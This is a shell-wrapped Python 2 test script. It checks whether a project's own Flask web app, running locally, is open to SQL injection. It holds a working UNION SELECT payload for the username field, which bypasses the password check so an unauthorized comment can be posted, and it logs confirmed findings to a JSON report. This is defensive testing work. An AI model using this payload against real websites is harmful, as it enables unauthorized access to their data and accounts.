#This is a test to see if a SQL injection is capable of modifying the page
python << END
import json
import hashlib
import requests


PROGRAM_SRC_NAME = "ProjectGitRepo/flask_webapp.py"
TESTCASE_SRC_NAME = "ProjectTests/test-001-sql_injection.sh"
VULNERABLE_PARAMETER = "username"

""" This attack string is entered into the username field and forces
the expected password to be the given username. This works as long as
the given username exists in the comments database (i.e. that user has
commented) This exploit allows an unauthorized user to comment on the
website. """
ATTACK_STRING = 'hello" UNION SELECT username FROM website_comments WHERE username="hello" AND "1"="1'

my_comment = "I HACK SITES"
my_username = ATTACK_STRING
my_password = "hello"

def git_hash(data):
	my_hash = hashlib.sha1("blob " + str(len(data)) + "\0" + data)
	return my_hash.hexdigest()

def git_hash_file(fname):
	f_obj = open(fname)
	f_data = f_obj.read()
	f_obj.close()
	return git_hash(f_data)

#First do a real comment with (U:'hello',P:'world')
requests.post("http://127.0.0.1:5000/do_comment",data={"username":"hello","password":"world","comment_text":"legitimate website comment"})

#Now try to make an unauthorized comment
r = requests.post("http://127.0.0.1:5000/do_comment",data={"username":my_username,"password":my_password,"comment_text":my_comment})
result_page = r.text
if my_comment in result_page:
	print "The page was compromised"
	f = open("json/sql_injection.json")
	json_data = json.loads(f.read())
	f.close()
	#A definite SQL injection was found so severity number becomes zero
	json_data['severity'] = 0
	vulnerability_info = {}
	vulnerability_info['file_hash'] = str(git_hash_file(str(PROGRAM_SRC_NAME)))
	vulnerability_info['testcase_hash'] = str(git_hash_file(str(TESTCASE_SRC_NAME)))
	vulnerability_info['testcase_name'] = str(TESTCASE_SRC_NAME)
	vulnerability_info['attacks'] = {VULNERABLE_PARAMETER:[ATTACK_STRING]}
	json_data['sql_injections'].append(vulnerability_info)
	
	#Save back to JSON file
	json_file = open("json/sql_injection.json",'w')
	json_file.write(json.dumps(json_data))
	json_file.close()
else:
	print "The page was not affected"
END
